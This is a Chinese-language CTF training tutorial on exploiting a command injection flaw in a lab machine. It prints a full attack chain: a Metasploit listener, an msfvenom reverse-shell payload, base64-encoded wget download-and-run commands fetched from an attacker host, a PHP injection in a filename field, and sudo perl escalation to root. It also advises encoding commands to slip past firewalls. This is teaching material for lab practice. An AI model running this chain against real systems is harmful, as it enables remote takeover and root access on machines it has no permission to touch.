# CTF最强战队蓝莲花内部培训教程：P24：25.命令注入 🎯

在本节课中，我们将学习如何利用命令注入漏洞，从发现漏洞到最终获取目标机器的控制权（即获取flag值）的完整流程。我们将使用Metasploit框架生成反弹shell，通过Web应用漏洞上传并执行恶意代码，最终实现权限提升。

---

## 信息收集与漏洞确认 🔍

上一节我们介绍了如何发现命令注入点。本节中我们来看看如何利用这个漏洞。

我们通过工具或网站搜索，确认了目标系统存在一个命令注入漏洞。具体表现为，在`filename`参数处注入系统命令（如`id`），服务器会执行并返回结果，显示当前用户为`www-data`。

**核心概念：命令注入**
当用户输入被直接拼接到系统命令中执行时，就可能发生命令注入。
```php
// 漏洞代码示例
system("cat " . $_GET[‘filename‘]);
```

## 准备攻击环境 ⚙️

![](img/575ef5e60f759a61d88c1000926f0ff8_7.png)

![](img/575ef5e60f759a61d88c1000926f0ff8_9.png)

确认漏洞后，我们需要准备攻击环境，核心是让靶场机器主动连接我们的攻击机，即“反弹shell”。

![](img/575ef5e60f759a61d88c1000926f0ff8_11.png)

以下是攻击准备步骤：

1.  **启动Metasploit监听器**：在攻击机上监听特定端口，等待靶场机器连接。
    ```bash
    msfconsole
    use exploit/multi/handler
    set payload linux/x86/meterpreter/reverse_tcp
    set LHOST 192.168.1.106  # 攻击机IP
    set LPORT 4444           # 监听端口
    exploit
    ```

2.  **生成恶意Shell文件**：创建一个Linux可执行文件，用于在靶场机器上执行并连接回我们的监听器。
    ```bash
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.106 LPORT=4444 -f elf > /var/www/html/shell.elf
    ```

3.  **启动Web服务器**：为了让靶场机器能下载我们生成的`shell.elf`文件，需要启动一个Web服务（如Apache）。
    ```bash
    service apache2 start
    ```

## 构造并发送攻击载荷 🚀

![](img/575ef5e60f759a61d88c1000926f0ff8_17.png)

![](img/575ef5e60f759a61d88c1000926f0ff8_19.png)

准备工作完成后，我们需要通过目标网站的漏洞，让靶场机器执行一系列命令来下载并运行我们的shell。

![](img/575ef5e60f759a61d88c1000926f0ff8_21.png)

为了绕过防火墙等安全检测，我们将命令进行Base64编码。

![](img/575ef5e60f759a61d88c1000926f0ff8_23.png)

以下是需要让靶场机器执行的三条命令：

![](img/575ef5e60f759a61d88c1000926f0ff8_25.png)

![](img/575ef5e60f759a61d88c1000926f0ff8_27.png)

1.  **下载Shell文件**：将攻击机上的`shell.elf`下载到靶场机器的临时目录。
    ```bash
    wget http://192.168.1.106/shell.elf -O /tmp/a
    ```
    编码后命令：
    ```
    echo “d2dldCBodHRwOi8vMTkyLjE2OC4xLjEwNi9zaGVsbC5lbGYgLU8gL3RtcC9hCg==” | base64 -d
    ```

2.  **赋予执行权限**：给下载的文件添加可执行权限。
    ```bash
    chmod 777 /tmp/a
    ```
    编码后命令：
    ```
    echo “Y2htb2QgNzc3IC90bXAvYQo=” | base64 -d
    ```

![](img/575ef5e60f759a61d88c1000926f0ff8_29.png)

![](img/575ef5e60f759a61d88c1000926f0ff8_30.png)

![](img/575ef5e60f759a61d88c1000926f0ff8_32.png)

3.  **执行Shell文件**：运行该文件，触发反弹shell连接。
    ```bash
    /tmp/a
    ```
    编码后命令：
    ```
    echo “L3RtcC9hCg==” | base64 -d
    ```

**攻击过程**：
我们使用Burp Suite等工具拦截网站的文件上传请求，将`filename`参数的值修改为PHP代码，利用`system()`函数和`base64_decode()`函数来依次执行上述三条编码后的命令。
```php
filename=”test.php; system(base64_decode(‘编码后的命令‘)); ?>
```
每发送一条请求，靶场机器就会执行相应的操作。

## 获取Shell与权限提升 👑

![](img/575ef5e60f759a61d88c1000926f0ff8_40.png)

![](img/575ef5e60f759a61d88c1000926f0ff8_42.png)

成功执行第三条命令后，我们在Metasploit监听端会收到一个来自靶场机器的meterpreter会话。

![](img/575ef5e60f759a61d88c1000926f0ff8_44.png)

1.  **确认当前权限**：首先检查我们获得的shell是什么权限。
    ```bash
    id
    ```
    结果显示用户是`www-data`，并非root。

![](img/575ef5e60f759a61d88c1000926f0ff8_46.png)

![](img/575ef5e60f759a61d88c1000926f0ff8_48.png)

![](img/575ef5e60f759a61d88c1000926f0ff8_50.png)

2.  **寻找提权路径**：检查当前用户可以用`sudo`执行哪些命令。
    ```bash
    sudo -l
    ```
    发现用户`www-data`可以无需密码以root权限运行`/usr/bin/perl`。

![](img/575ef5e60f759a61d88c1000926f0ff8_52.png)

3.  **利用Perl进行提权**：使用Perl的`exec`函数来启动一个具有root权限的bash shell。
    ```bash
    sudo perl -e ‘exec “/bin/bash”‘
    bash -i
    ```
    执行后，命令提示符变为`#`，表示已获得root权限。

## 获取Flag与总结 🏁

![](img/575ef5e60f759a61d88c1000926f0ff8_58.png)

![](img/575ef5e60f759a61d88c1000926f0ff8_60.png)

获得root权限后，最后一步就是寻找并读取flag文件。

![](img/575ef5e60f759a61d88c1000926f0ff8_62.png)

![](img/575ef5e60f759a61d88c1000926f0ff8_64.png)

1.  **定位Flag文件**：通常flag位于根目录。
    ```bash
    cd /root
    ls
    ```

![](img/575ef5e60f759a61d88c1000926f0ff8_66.png)

![](img/575ef5e60f759a61d88c1000926f0ff8_68.png)

2.  **读取Flag**：使用`cat`命令查看flag文件内容。
    ```bash
    cat flag.txt
    ```
    至此，我们成功完成了从命令注入到完全控制目标机器并获取flag的整个过程。

### 本节课总结

![](img/575ef5e60f759a61d88c1000926f0ff8_74.png)

本节课我们一起学习了命令注入漏洞的完整利用链：
1.  **信息收集**：充分收集目标信息，利用现有EXP（漏洞利用代码）是最高效的方式。
2.  **环境搭建**：使用Metasploit生成反弹shell并开启监听。
3.  **载荷投递**：通过Web漏洞上传编码后的命令，绕过安全机制。
4.  **权限提升**：利用系统配置弱点（如sudo权限）将普通用户权限提升至root。
5.  **获取目标**：最终定位并读取flag文件。

![](img/575ef5e60f759a61d88c1000926f0ff8_76.png)

关键要点：在渗透测试中，应优先尝试利用已知漏洞，同时注意使用编码等方式绕过安全防护。
